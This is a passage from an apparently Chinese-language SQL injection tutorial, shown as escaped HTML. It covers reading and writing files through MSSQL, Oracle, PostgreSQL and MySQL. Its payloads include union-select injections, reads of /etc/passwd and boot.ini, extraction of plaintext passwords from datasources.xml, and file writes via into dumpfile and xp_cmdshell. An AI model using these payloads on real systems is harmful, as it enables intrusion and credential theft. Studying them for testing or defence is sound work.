sname=&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fn_varbintohexstr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;substring&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;assembly_files&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#将二进制文件读取到web页面&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; assembly sqb &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;c:\temp\test.exe&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#添加到原始库&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; assembly sqb &lt;span class=&#34;token keyword&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;c:\windows\system32\net.exe&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;alter&lt;/span&gt; assembly sqb &lt;span class=&#34;token keyword&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;c:\temp\test.txt&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;Oracle-5&#34;&gt;&lt;a href=&#34;#Oracle-5&#34; class=&#34;headerlink&#34; title=&#34;Oracle&#34;&gt;&lt;/a&gt;Oracle&lt;/h5&gt;&lt;p&gt; utl_file_dir/Oracle 目录、Java、Oracle Text三种接口访问文件&lt;/p&gt;
&lt;p&gt; utl_file_dir/Oracle 目录&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;utl_file&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;PL&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; Oracle &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt; 至 &lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

DBMS_LOB&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;PL&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; Oracle &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt; 至 &lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#从rds.txt文件读取了1000个字节(从第1个字节开始)，该文件位于MEDIA DIR目录中。&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt;
buf varchar2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4096&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
BEG &lt;span class=&#34;token operator&#34;&gt;IN&lt;/span&gt;
Lob_loc:&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; BFILENAME&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MEDIA_DIR&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;rds.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
DBMS_LOB&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;OPEN&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Lob_loc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; DBMS_LOB&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;LOB_READONLY&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
DBMS_LOB&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;READ&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Lob_loc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; buf&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
dbms_output&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;put_line&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;utl_raw&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cast_to_varchar2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;buf&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
DBMS_LOB&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;CLOSE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Lob_loc&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

外部表&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;PL&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; Oracle &lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;i R2 至 &lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; directory ext &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C:\&#39;;
CREATE TABLE ext_tab(
line varchar2(256))
ORGANIZATION EXTERNAL (TYPE oracle_loader
DEFAULT DIRECTORY extACCESS PARAMETERS (
RECORDS DELIMITED BY NEWLINE
BADFILE &#39;&lt;/span&gt;bad_data&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;bad&lt;span class=&#34;token string&#34;&gt;&#39;
LOGFILE &#39;&lt;/span&gt;log_data&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log&lt;span class=&#34;token string&#34;&gt;&#39;
FIELDS TERMINATED BY &#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;
MISSING FIELD VALUES ARE NULL
REJECT ROWS WITH ALL NULL FIELDS
(line))
LOCATION (&#39;&lt;/span&gt;victim&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt&lt;span class=&#34;token string&#34;&gt;&#39;)
)
PARALLEL
REJECT LIMIT 0
NOMONITORING;
Select * from ext_tab;

&#39;&lt;/span&gt;
XMLType&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;PL&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; Oracle &lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;i R2 至 &lt;span class=&#34;token number&#34;&gt;11&lt;/span&gt;g&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#从data-source.xml文件中读取用户名、明文口令和连接字符串&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/connection-factory/@user&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/connection-factory/@password&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;@&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/connection-factory/@url&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;instr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;extractvalue&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/connection-factory/@url&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;//&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; conn &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;XMLSequence&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;extract&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;xmltype&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bfilename&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;GETPWDIR&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;datasources.xml&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;nls_charset_id&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;WE8ISO8859P1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;/data-sources/connection-pool/connection-factory&#39;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;c
&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#Oracle Text是一种很少有人知道的读取文件和URInate的技术。它不需要Java或utl_file_dir/Oracle目录，只需将想读取的文件或URL插入到一张表中并创建一个全文索引或者一直等待全文索引创建成功即可。该索引了包含整个文件的内容。&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#下列示例代码说明了如何通过将boot.ini插入到一张表中来读取该文件&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; files &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;id NUMBER &lt;span class=&#34;token keyword&#34;&gt;PRIMARY&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;KEY&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
path &lt;span class=&#34;token keyword&#34;&gt;VARCHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;255&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;UNIQUE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;ot_format &lt;span class=&#34;token keyword&#34;&gt;VARCHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; files &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;c:\boot.ini&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INDEX&lt;/span&gt; file_index &lt;span class=&#34;token keyword&#34;&gt;ON&lt;/span&gt; files&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;path&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; INDEXTYPE &lt;span class=&#34;token operator&#34;&gt;IS&lt;/span&gt; ctxsys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;contextPARAMETERS&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;datastore ctxsys.file_datastore format column ot_format&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- retrieve data from the fulltext index&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;Select&lt;/span&gt; token_text &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dr$file_index$i&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;PostgreSQL-3&#34;&gt;&lt;a href=&#34;#PostgreSQL-3&#34; class=&#34;headerlink&#34; title=&#34;PostgreSQL&#34;&gt;&lt;/a&gt;PostgreSQL&lt;/h5&gt;&lt;p&gt;PostgreSQL提供了内置的COPY功能，可以将文本文件复制到表中的text字段，使用COPY 功能复制文件时，该文本文件应该是完全可读的(world readable),或者运行PostgreSQL进程的用户(通常是postgres用户)应该是该文件的所有者。&lt;/p&gt;
&lt;p&gt;下面的例子演示了攻击者如何读取 ‘etc/passwd’文件的内容：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#创建一个临时表&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//10.10.10.114/test.php?id=1;CREATE table temp (name text);-- &lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#将文件复制到表中&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//10.10.10.114/test.php?id=1;copy temp from &#39;/etc/passwd&#39;-- &lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#读取表。在将文件复制到表中之后，就可以使用SQL注入技术来读取该表，比如使用 union技术或盲注技术&lt;/span&gt;
http:&lt;span class=&#34;token comment&#34;&gt;//10.10.10.114/test.php?id=l union select 2,name from temp-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;写文件&#34;&gt;&lt;a href=&#34;#写文件&#34; class=&#34;headerlink&#34; title=&#34;写文件&#34;&gt;&lt;/a&gt;写文件&lt;/h4&gt;&lt;h5 id=&#34;MySQL-1&#34;&gt;&lt;a href=&#34;#MySQL-1&#34; class=&#34;headerlink&#34; title=&#34;MySQL&#34;&gt;&lt;/a&gt;MySQL&lt;/h5&gt;&lt;p&gt;select into outfile（dumpfile）该命令可以将一条select语句的结果写到MySQL进程所有者拥有的完全可读的文件中（dumpfile允许写二进制文件）&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;into&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;outfile&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/tmp/test.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#使用下列搜索字符串：&lt;/span&gt;
aaa &lt;span class=&#34;token string&#34;&gt;&#39;union select NULL,&#39;&lt;/span&gt;SensePost &lt;span class=&#34;token number&#34;&gt;2008&lt;/span&gt;\n&lt;span class=&#34;token string&#34;&gt;&#39; into dumpfile &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;tmp&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;sp&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt&#39; &lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用的是dumpfile(允许输出二进制文件)而非 outfile，这样一来，要想正常结束一行，就必须提供\n&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; UNHEX&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;53656E7365506F7374203038&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#unhex()和hex()相反&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;Mssql-1&#34;&gt;&lt;a href=&#34;#Mssql-1&#34; class=&#34;headerlink&#34; title=&#34;Mssql&#34;&gt;&lt;/a&gt;Mssql&lt;/h5&gt;&lt;p&gt;读取文件的scripting.filesystem对象方法来有效地向文件系统写文件，也可以使用该技术来写二进制文件，某些代码页面使用该技术的话会出现错误，对于这种情况，可以使用其他对象而非filesystem对象，比如ADODB.Stream。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#批量复制程序BCP&lt;/span&gt;
C:\&lt;span class=&#34;token keyword&#34;&gt;temp&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;bcp &lt;span class=&#34;token string&#34;&gt;&#34;select name from sysobjects&#34;&lt;/span&gt; queryout testout&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;c &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;S &lt;span class=&#34;token number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;U sa &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;P&lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#使用重定向运算符&amp;gt;&amp;gt;创建文本文件：&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; xp_cmdshell &lt;span class=&#34;token string&#34;&gt;&#39;echo This	is a test &amp;gt;c:\temp\test.txt&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; xp_cmdshell &lt;span class=&#34;token string&#34;&gt;&#39;echo This	is line	2 &amp;gt;&amp;gt;c:\temp\test.txt&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; xp_cmdshell &lt;span class=&#34;token string&#34;&gt;&#39;echo This	is line	3
